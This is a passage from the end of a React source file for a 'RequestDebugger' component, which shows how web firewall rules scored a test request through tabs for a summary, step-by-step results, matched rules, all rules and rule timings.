                                    ))}
                                </Stack>
                            </Grid>
                        ))}
                    </Grid>
                </DialogContent>
                <DialogActions>
                    <Button onClick={() => setIpDialogOpen(false)}>Close</Button>
                </DialogActions>
            </Dialog>

            {results && (
                <Paper sx={{ p: 3, height: 'auto'}}>
                    <Box sx={{ mb: 3 }}>
                        <Typography variant="h6" mb={2}>Evaluation Results</Typography>
                        <Stack direction="row" spacing={2} flexWrap="wrap">
                            <Chip 
                                label={`Total Rules: ${results.length}`} 
                                color="default" 
                            />
                            <Chip 
                                label={`Matched: ${matchedRules.length}`} 
                                color="primary" 
                            />
                            <Chip 
                                label={`Blocked: ${blockedRules.length}`} 
                                color="error" 
                            />
                            <Chip 
                                label={`Allowed: ${allowedRules.length}`} 
                                color="success" 
                            />
                            <Chip 
                                label={`Avg Time: ${(results.reduce((sum, r) => sum + r.evaluationTime, 0) / results.length).toFixed(2)}ms`} 
                                color="info" 
                            />
                            {results.some(r => r.source === 'aws') && (
                                <Chip 
                                    label="AWS Live Testing"
                                    color="success"
                                    size="small"
                                    startIcon={<CloudIcon />}
                                />
                            )}
                        </Stack>
                    </Box>

                    <Tabs value={activeTab} onChange={(_, v) => setActiveTab(v)} sx={{ mb: 2 }}>
                        <Tab label="Summary" />
                        <Tab label="Step-by-Step" />
                        <Tab label="Matched Rules" />
                        <Tab label="All Rules" />
                        <Tab label="Performance" />
                    </Tabs>

                    {activeTab === 0 && (
                        <Box>
                            {/* Blocked/Allowed/No Match Alerts */}
                            {blockedRules.length > 0 ? (
                                <Alert severity="error" sx={{ mb: 2 }}>
                                    <Typography variant="h6">Request Would Be BLOCKED</Typography>
                                    <Typography>
                                        {blockedRules.length} rule(s) would block this request. 
                                        Highest priority blocking rule: {blockedRules[0]?.rule.Name || blockedRules[0]?.rule.name}
                                    </Typography>
                                </Alert>
                            ) : matchedRules.length > 0 ? (
                                <Alert severity="success" sx={{ mb: 2 }}>
                                    <Typography variant="h6">Request Would Be PASSED</Typography>
                                    <Typography>
                                        {matchedRules.length} rule(s) matched, but none would block the request.
                                    </Typography>
                                </Alert>
                            ) : (
                                <Alert severity="info" sx={{ mb: 2 }}>
                                    <Typography variant="h6">No Rules Matched</Typography>
                                    <Typography>
                                        This request did not match any rules. Default action would apply.
                                    </Typography>
                                </Alert>
                            )}
                            {/* AI/Local Summary - now below the verdict alert */}
                            {aiSummary && (
                                <Alert severity="info" sx={{ mb: 2 }}>
                                    <Typography variant="subtitle1"><b>Summary</b></Typography>
                                    <Typography>{aiSummary}</Typography>
                                </Alert>
                            )}
                        </Box>
                    )}

                    {activeTab === 1 && (
                        <Box>
                            <Stepper activeStep={currentStep} orientation="vertical">
                                {results.map((result, index) => (
                                    <Step key={index}>
                                        <StepLabel>
                                            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                                                {result.matched ? 
                                                    (result.action === 'BLOCK' || result.action === 'DENY' ? 
                                                        <CancelIcon color="error" /> : 
                                                        <CheckCircleIcon color="success" />
                                                    ) : 
                                                    <InfoIcon color="disabled" />
                                                }
                                                <Typography>
                                                    {result.rule.Name || result.rule.name} (Priority: {result.priority})
                                                </Typography>
                                                <Chip 
                                                    label={result.riskLevel} 
                                                    size="small" 
                                                    color={getRiskLevelColor(result.riskLevel)}
                                                />
                                            </Box>
                                        </StepLabel>
                                        <StepContent>
                                            <Paper sx={{ p: 2, mb: 2 }}>
                                                <Typography variant="body2" color="text.secondary" gutterBottom>
                                                    {result.reason}
                                                </Typography>
                                                <Typography variant="caption" display="block" gutterBottom>
                                                    Evaluation Time: {result.evaluationTime.toFixed(2)}ms
                                                </Typography>
                                                {result.details.map((detail, detailIndex) => (
                                                    <Box key={detailIndex} sx={{ mt: 1, p: 1, bgcolor: 'grey.50', borderRadius: 1 }}>
                                                        <Typography variant="caption" display="block">
                                                            <strong>{detail.field}:</strong> {detail.value}
                                                        </Typography>
                                                        <Typography variant="caption" display="block">
                                                            <strong>Pattern:</strong> {detail.searchString || detail.pattern}
                                                        </Typography>
                                                        <Typography variant="caption" display="block">
                                                            <strong>Matched:</strong> {detail.matched ? 'Yes' : 'No'}
                                                        </Typography>
                                                    </Box>
                                                ))}
                                            </Paper>
                                        </StepContent>
                                    </Step>
                                ))}
                            </Stepper>
                        </Box>
                    )}

                    {activeTab === 2 && (
                        <Box>
                            {matchedRules.length === 0 ? (
                                <Alert severity="info">No rules matched this request.</Alert>
                            ) : (
                                <Stack spacing={2}>
                                    {matchedRules.map((result, index) => (
                                        <Card key={index} variant="outlined" sx={{ cursor: 'pointer' }}
                                            onClick={() => { setSelectedRule(result.rule); setPopupOpen(true); }}
                                        >
                                            <CardContent>
                                                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 1 }}>
                                                    {result.action === 'BLOCK' || result.action === 'DENY' ? 
                                                        <CancelIcon color="error" /> : 
                                                        <CheckCircleIcon color="success" />
                                                    }
                                                    <Typography variant="h6">
                                                        {result.rule.Name || result.rule.name}
                                                    </Typography>
                                                    <Chip label={`Priority: ${result.priority}`} size="small" />
                                                    <Chip label={result.action} size="small" color={result.action === 'BLOCK' || result.action === 'DENY' ? 'error' : 'success'} />
                                                    <Chip 
                                                        label={result.riskLevel} 
                                                        size="small" 
                                                        color={getRiskLevelColor(result.riskLevel)}
                                                    />
                                                </Box>
                                                <Typography variant="body2" color="text.secondary" gutterBottom>
                                                    {result.reason}
                                                </Typography>
                                                <Typography variant="caption" display="block" gutterBottom>
                                                    Evaluation Time: {result.evaluationTime.toFixed(2)}ms
                                                </Typography>
                                                {result.details.map((detail, detailIndex) => (
                                                    <Box key={detailIndex} sx={{ mt: 1, p: 1, bgcolor: 'grey.50', borderRadius: 1 }}>
                                                        <Typography variant="caption" display="block">
                                                            <strong>{detail.field}:</strong> {detail.value}
                                                        </Typography>
                                                        <Typography variant="caption" display="block">
                                                            <strong>Pattern:</strong> {detail.searchString || detail.pattern}
                                                        </Typography>
                                                    </Box>
                                                ))}
                                            </CardContent>
                                        </Card>
                                    ))}
                                </Stack>
                            )}
                            <RuleDetailsPopup
                                open={popupOpen}
                                onClose={() => setPopupOpen(false)}
                                rule={selectedRule}
                                dataArray={combinedRules}
                            />
                        </Box>
                    )}

                    {activeTab === 3 && (
                        <Box>
                            <Stack spacing={2}>
                                {results.map((result, index) => (
                                    <Card key={index} variant="outlined">
                                        <CardContent>
                                            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 1 }}>
                                                {result.matched ? 
                                                    (result.action === 'BLOCK' || result.action === 'DENY' ? 
                                                        <CancelIcon color="error" /> : 
                                                        <CheckCircleIcon color="success" />
                                                    ) : 
                                                    <InfoIcon color="disabled" />
                                                }
                                                <Typography variant="h6">
                                                    {result.rule.Name || result.rule.name}
                                                </Typography>
                                                <Chip label={`Priority: ${result.priority}`} size="small" />
                                                <Chip label={result.action} size="small" color={result.action === 'BLOCK' || result.action === 'DENY' ? 'error' : 'success'} />
                                                {result.matched && <Chip label="MATCHED" size="small" color="primary" />}
                                                <Chip 
                                                    label={result.riskLevel} 
                                                    size="small" 
                                                    color={getRiskLevelColor(result.riskLevel)}
                                                />
                                            </Box>
                                            <Typography variant="body2" color="text.secondary">
                                                {result.reason}
                                            </Typography>
                                            <Typography variant="caption" display="block" gutterBottom>
                                                Evaluation Time: {result.evaluationTime.toFixed(2)}ms
                                            </Typography>
                                        </CardContent>
                                    </Card>
                                ))}
                            </Stack>
                        </Box>
                    )}

                    {activeTab === 4 && (
                        <Box>
                            <Typography variant="h6" mb={2}>Performance Analysis</Typography>
                            <TableContainer component={Paper}>
                                <Table>
                                    <TableHead>
                                        <TableRow>
                                            <TableCell>Rule Name</TableCell>
                                            <TableCell>Priority</TableCell>
                                            <TableCell>Evaluation Time (ms)</TableCell>
                                            <TableCell>Risk Level</TableCell>
                                            <TableCell>Action</TableCell>
                                        </TableRow>
                                    </TableHead>
                                    <TableBody>
                                        {results.map((result, index) => (
                                            <TableRow key={index}>
                                                <TableCell>{result.rule.Name || result.rule.name}</TableCell>
                                                <TableCell>{result.priority}</TableCell>
                                                <TableCell>{result.evaluationTime.toFixed(2)}</TableCell>
                                                <TableCell>
                                                    <Chip 
                                                        label={result.riskLevel} 
                                                        size="small" 
                                                        color={getRiskLevelColor(result.riskLevel)}
                                                    />
                                                </TableCell>
                                                <TableCell>{result.action}</TableCell>
                                            </TableRow>
                                        ))}
                                    </TableBody>
                                </Table>
                            </TableContainer>
                        </Box>
                    )}
                </Paper>
            )}
        </Container>
    );
};

export default RequestDebugger; 